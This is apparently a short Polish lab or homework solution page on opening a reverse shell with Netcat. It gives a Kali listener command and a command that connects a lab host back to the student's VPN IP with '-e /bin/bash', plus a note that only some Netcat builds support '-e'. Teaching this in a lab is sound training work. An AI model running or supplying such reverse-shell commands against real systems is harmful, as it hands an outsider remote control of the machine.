---
title: "6.2 - Reverse shell przez Netcat"
order: 2
---

> **Uwaga do rozwiązania:** Opcja `-e` jest dostępna tylko w części odmian Netcata. Jej brak w zainstalowanej wersji nie oznacza błędu w adresie lub porcie.

```bash
#Kali (terminal 1):
nc -lvp 12302

#Remote Shells HOMEWORK (terminal 2):
nc [IP_STUDENTA] 12302 -e /bin/bash #Replace [IP_STUDENTA] with your VPN IP
```
